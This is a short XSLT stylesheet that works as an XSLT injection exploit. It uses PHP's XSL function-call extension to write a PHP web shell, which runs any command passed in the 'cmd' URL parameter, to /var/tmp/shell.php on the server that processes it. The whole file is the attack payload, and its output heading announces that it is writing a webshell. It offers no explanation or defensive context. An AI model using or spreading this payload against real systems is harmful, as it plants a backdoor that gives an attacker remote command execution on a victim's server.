<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="*">

    <xsl:variable name="php">
      &lt;?php echo shell_exec($_GET['cmd']); ?&gt;
    </xsl:variable>

    <html><body>
      <h2>Writing Webshell to /var/tmp/shell.php</h2>
      <pre>
        <xsl:value-of select="php:function('file_put_contents', '/var/tmp/shell.php', $php)" />
      </pre>
    </body></html>

  </xsl:template>
</xsl:stylesheet>
